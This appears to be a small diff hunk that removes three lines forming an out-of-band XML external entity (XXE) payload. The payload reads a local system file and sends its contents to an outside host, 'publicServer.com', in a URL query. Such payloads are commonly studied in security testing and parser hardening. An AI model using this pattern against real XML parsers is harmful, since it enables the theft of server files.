@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "file:///sys/power/image_size">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
-%all;
